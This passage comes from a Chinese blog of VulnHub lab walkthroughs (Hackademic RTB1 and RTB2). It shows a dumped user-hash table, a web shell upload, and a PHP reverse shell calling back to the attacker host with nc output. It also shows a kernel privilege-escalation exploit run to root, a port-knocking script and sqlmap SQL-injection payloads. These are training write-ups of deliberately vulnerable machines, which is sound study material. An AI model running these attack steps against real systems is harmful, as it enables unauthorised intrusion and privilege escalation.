&lt;blank&gt;      | georgemiller  | GeorgeMiller  | Miller        | George         | 2011-01-07 03:08:51 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 4  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          | TonyBlack@hacked.com    | 0           | &lt;blank&gt;     | &lt;blank&gt;      | tonyblack     | TonyBlack     | Black         | Tony           | 2011-01-07 03:09:55 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 5  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          | JasonKonnors@hacked.com | 0           | &lt;blank&gt;     | &lt;blank&gt;      | jasonkonnors  | JasonKonnors  | Konnors       | Jason          | 2011-01-07 03:10:36 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 6  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          | MaxBucky@hacked.com     | 0           | &lt;blank&gt;     | &lt;blank&gt;      | maxbucky      | MaxBucky      | Bucky         | Max            | 2011-01-07 03:11:18 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line"></span><br><span class="line">NickJames   21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">JohnSmith   b986448f0bb9e5e124ca91d3d650f52c</span><br><span class="line">GeorgeMiller  7cbb3252ba6b7e9c422fac5334d22054</span><br><span class="line">TonyBlack   a6e514f9486b83cb53d8d932f9a04292</span><br><span class="line">JasonKonnors 8601f6e1028a8e8a966f6c33fcd9aec4</span><br><span class="line">MaxBucky   50484c19f1afdaf3841a0d821ed393d2</span><br></pre></td></tr></table></figure>

<h3 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h3><p>5个用户爆出账号密码之后，发现GeorgeMiller有管理员权限，使用此账号登录GeorgeMiller/q1w2e3<br>如下图所示改为允许php文件上传</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub39.jpg"></p>
<p>上传文件成功</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub40.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub41.jpg"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>冰蝎中执行命令查看内核版本</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub42.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 <span class="comment">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>为此内核使用漏洞利用建议脚本。 可以在这里下载脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BlbnR1cmFMYWJzL0xpbnV4X0V4cGxvaXRfU3VnZ2VzdGVy">Linux_Exploit_Suggester<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./Linux_Exploit_Suggester.pl -k 2.6.31</span></span><br><span class="line"></span><br><span class="line">Kernel <span class="built_in">local</span>: 2.6.31</span><br><span class="line"></span><br><span class="line">Searching among 65 exploits...</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] american-sign-language</span><br><span class="line">   CVE-2010-4347</span><br><span class="line">   Source: http://www.securityfocus.com/bid/45408/</span><br><span class="line">[+] can_bcm</span><br><span class="line">   CVE-2010-2959</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/14814/</span><br><span class="line">[+] do_pages_move</span><br><span class="line">   Alt: sieve    CVE-2010-0415</span><br><span class="line">   Source: Spenders Enlightenment</span><br><span class="line">[+] half_nelson</span><br><span class="line">   Alt: econet    CVE-2010-3848</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/6851</span><br><span class="line">[+] half_nelson1</span><br><span class="line">   Alt: econet    CVE-2010-3848</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] half_nelson2</span><br><span class="line">   Alt: econet    CVE-2010-3850</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] half_nelson3</span><br><span class="line">   Alt: econet    CVE-2010-4073</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] msr</span><br><span class="line">   CVE-2013-0268</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/27297/</span><br><span class="line">[+] pipe.c_32bit</span><br><span class="line">   CVE-2009-3547</span><br><span class="line">   Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c</span><br><span class="line">[+] pktcdvd</span><br><span class="line">   CVE-2010-3437</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15150/</span><br><span class="line">[+] ptrace_kmod2</span><br><span class="line">   Alt: ia32syscall,robert_you_suck    CVE-2010-3301</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15023/</span><br><span class="line">[+] rawmodePTY</span><br><span class="line">   CVE-2014-0196</span><br><span class="line">   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c</span><br><span class="line">[+] rds</span><br><span class="line">   CVE-2010-3904</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15285/</span><br><span class="line">[+] reiserfs</span><br><span class="line">   CVE-2010-1146</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/12130/</span><br><span class="line">[+] video4linux</span><br><span class="line">   CVE-2010-3081</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15024/</span><br></pre></td></tr></table></figure>

<p>一个个慢慢尝试，直到使用了rds这个exploit成功了。<br>[+] rds<br>   CVE-2010-3904<br>   Source: <span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">http://www.exploit-db.com/exploits/15285/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>然后使用冰蝎的shell将15285.c上传到服务器目录下</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub43.jpg"></p>
<p>locate命令查找kali中的php的reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># locate shells</span></span><br><span class="line">/usr/share/webshells/asp</span><br><span class="line">/usr/share/webshells/aspx</span><br><span class="line">/usr/share/webshells/cfm</span><br><span class="line">/usr/share/webshells/jsp</span><br><span class="line">/usr/share/webshells/laudanum</span><br><span class="line">/usr/share/webshells/perl</span><br><span class="line">/usr/share/webshells/php</span><br><span class="line">/usr/share/webshells/asp/cmd-asp-5.1.asp</span><br><span class="line">/usr/share/webshells/asp/cmdasp.asp</span><br><span class="line">/usr/share/webshells/aspx/cmdasp.aspx</span><br><span class="line">/usr/share/webshells/cfm/cfexec.cfm</span><br><span class="line">/usr/share/webshells/jsp/cmdjsp.jsp</span><br><span class="line">/usr/share/webshells/jsp/jsp-reverse.jsp</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/perl/perlcmd.cgi</span><br><span class="line">/usr/share/webshells/php/findsocket</span><br><span class="line">/usr/share/webshells/php/php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/qsd-php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/simple-backdoor.php</span><br><span class="line">/usr/share/webshells/php/findsocket/findsock.c</span><br><span class="line">/usr/share/webshells/php/findsocket/php-findsock-shell.php</span><br></pre></td></tr></table></figure>

<p>其中/usr/share/webshells/php/php-reverse-shell.php即为要使用的shell,leafpad打开此文件修改ip地址和端口号如下图,改成kali攻击机的ip和端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub44.jpg"></p>
<p>然后同样如上方式上传到服务器的目录下,浏览器访问该木马，同时kali攻击机上nc监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.84.140: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.84.135] from (UNKNOWN) [192.168.84.140] 51935</span><br><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 <span class="comment">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 02:55:19 up  4:02,  0 users,  load average: 4.99, 4.97, 4.91</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-4.0$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">sh-4.0$ id</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line">id</span><br><span class="line">sh-4.0$</span><br></pre></td></tr></table></figure>
<p>成功弹回shell  ;););)</p>
<p>gcc编译提权脚本并执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-4.0$ ls</span><br><span class="line">15285.c</span><br><span class="line">php-reverse-shell.php</span><br><span class="line">plugins</span><br><span class="line">shell.php</span><br><span class="line">themes</span><br><span class="line">ls</span><br><span class="line">sh-4.0$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">chmod: changing permissions of `plugins<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">chmod: changing permissions of `themes&#x27;</span>: Operation not permitted</span><br><span class="line">sh-4.0$ gcc 15285.c -o 15285</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">sh-4.0$ ./15285</span><br><span class="line">./15285</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Restoring <span class="keyword">function</span> pointer...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>提权成功！就是这么屌！！！接下来读取key.txt文件找到密码，挑战完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">Desktop</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">key.txt</span><br><span class="line">key.txt~</span><br><span class="line"></span><br><span class="line">cat key.txt</span><br><span class="line">Yeah!!</span><br><span class="line">You must be proud because you <span class="string">&#x27;ve got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_d&amp;jgQ&gt;&gt;ak\#b&quot;(Hx&quot;o&lt;la_%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string">mr.pr0n || p0wnbox.Team || 2011</span></span><br><span class="line"><span class="string">http://p0wnbox.com</span></span><br></pre></td></tr></table></figure>

<h3 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h3><p>还可以使用如下命令将shell变得看起来更舒服</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>不好意思，这次没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Hackademic-RTB2]</title>
    <url>/2019/12/12/Hackademic-RTB2/</url>
    <content><![CDATA[<p>名称：Hackademic：RTB2<br>发布日期：2011年9月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMi56aXA=">https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMi56aXAudG9ycmVudA==">https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>这是mr.pr0n提出的第二个现实黑客攻击挑战<br>下载目标并获得root。<br>毕竟，尝试读取根目录中文件“ key.txt”的内容。<br>请享用！</p>
<p>漏洞：</p>
<ul>
<li>纯文本密码</li>
<li>特权提升</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.84.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 00:0C:29:74:B5:21 (VMware)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.142</span></span><br><span class="line">80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.142</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.142:80/</span><br><span class="line">|     Form id: username</span><br><span class="line">|_    Form action: check.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /phpmyadmin/: phpMyAdmin</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|_  /index/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.14 (Ubuntu)</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.2.14: </span><br><span class="line">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span><br><span class="line">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span><br><span class="line">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span><br><span class="line">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span><br><span class="line">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span><br><span class="line">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span><br><span class="line">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span><br><span class="line">|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557</span><br><span class="line">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span><br><span class="line">|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068</span><br><span class="line">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span><br><span class="line">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span><br><span class="line">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span><br><span class="line">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span><br><span class="line">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span><br><span class="line">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span><br><span class="line">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span><br><span class="line">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span><br><span class="line">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span><br><span class="line">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span><br><span class="line">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span><br><span class="line">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span><br><span class="line">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br><span class="line">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span><br><span class="line">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span><br><span class="line">666/tcp filtered doom</span><br></pre></td></tr></table></figure>

<p>经过尝试发现80端口没有什么好东西，666端口被过滤,源代码中没有任何内容，可疑标头，登录中没有sql注入。 我在目标上运行了OpenVAS，Dirbuster和Nikto，但是除了Phpmyadmin界面外，什么都没有发现，无论执行什么操作，该界面始终使我“无法连接到MySQL服务器”错误。 我以为Web服务器可能是一个错误的前端，而这可能是机器上隐藏的其他东西，所以接下来我运行了UDP扫描，它显示了一个附加端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sU -F -n -T4 -v 192.168.84.142</span></span><br><span class="line">5353/udp  open          zeroconf</span><br></pre></td></tr></table></figure>

<p>在<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguODQuMTQzLyVFNyU5OSVCQiVFOSU5OSU4NiVFOSVBMSVCNSVFOSU5RCVBMiVFOCVCRSU5MyVFNSU4NSVBNSYjMzk7">http://192.168.84.143/登陆页面输入&#39;<i class="fa fa-external-link-alt"></i></span> or 1=1–’  ///  ‘ or 1=1–’发现返回了一个页面其中有Ok, nice shot…<br>…but, you are looking in a wrong place bro! ;-),直接右键查看源代码，发现异常字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p>先url解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0ad 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e</span><br></pre></td></tr></table></figure>

<p>再hex解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; - - - - - - - - - &gt; </span><br><span class="line"> </span><br><span class="line"> K n o c k   K n o c k   K n o c k i n <span class="string">&#x27;   o n   h e a v e n &#x27;</span> s   d o o r   . .   : ) </span><br><span class="line"> </span><br><span class="line"> 0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1 </span><br><span class="line"> </span><br><span class="line"> &lt; - - - - - - - - - &gt;</span><br></pre></td></tr></table></figure>

<p>再二进制解码,<span class="exturl" data-url="aHR0cDovL3d3dy5zbmFya2xlcy5uZXQvc2NyaXB0cy9zbmVhay9zbmVhay5waHA=">SNEAK: Snarkles.Net Encryption Assortment Kit - Version 1.28<i class="fa fa-external-link-alt"></i></span>,得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1001:1101:1011:1001</span><br></pre></td></tr></table></figure>

<p>看来是做了端口碰撞措施，端口碰撞的主要目的是通过进行端口扫描来防止攻击者扫描系统以寻找可能被利用的服务，因为除非攻击者发送正确的碰撞顺序，否则受保护的端口将显得关闭。编写下列bash脚本打开666端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1001 1101 1011 1001</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">nc 192.168.84.143 80 <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>运行脚本，稍等片刻端口即可打开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./knock.sh</span></span><br></pre></td></tr></table></figure>

<p>进一步的版本扫描表明这是多播DNS协议。找不到任何可利用的东西。再次使用详细标志和–packet-trace选项运行Nmap，这一次它返回了一个新端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --packet-trace 192.168.84.142</span><br><span class="line"></span><br><span class="line">NSE: TCP 192.168.84.135:52112 &gt; 192.168.84.142:666 | CLOSE</span><br><span class="line">NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD <span class="comment">#70)</span></span><br><span class="line">NSE: TCP 192.168.84.135:41738 &gt; 192.168.84.142:80 | CLOSE</span><br><span class="line">NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD <span class="comment">#71)</span></span><br><span class="line">Completed NSE at 02:17, 0.10s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">80/tcp  open  http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.2.14 (Ubuntu)</span><br><span class="line">|_http-title: Hackademic.RTB2</span><br><span class="line">666/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! 1.5 - Open Source Content Management</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 14 disallowed entries </span><br><span class="line">| /administrator/ /cache/ /components/ /images/ </span><br><span class="line">| /includes/ /installation/ /language/ /libraries/ /media/ </span><br><span class="line">|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/</span><br><span class="line">|_http-server-header: Apache/2.2.14 (Ubuntu)</span><br><span class="line">|_http-title: Hackademic.RTB2</span><br></pre></td></tr></table></figure>

<p>一定是以前报告为已过滤的端口。 版本扫描显示这实际上是另一台Web服务器！nmap牛逼！！！firefox访问666端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub45.jpg"></p>
<p>可以看到是joomla 1.5 templates版本的。</p>
<h3 id="使用自己的方法getshell"><a href="#使用自己的方法getshell" class="headerlink" title="使用自己的方法getshell"></a>使用自己的方法getshell</h3><p>点击下图所示的位置，burp抓包保存为sqlmap.txt，然后sqlmap -r跑此包,发现是dba权限的注入能–os-shell，多年前的老靶机果真是够垃圾，我主要是用来学习各种漏洞知识点，以便于实战碰到的话，能够迅速联想到是什么漏洞并且成功利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --is-dba</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.3.12#stable&#125;                                                              </span></span><br><span class="line"><span class="string">|_ -| . [)]     | .&#x27;</span>| . |                                                                              </span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:21:49 /2019-12-12/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:21:49] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:21:49] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: letter (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span 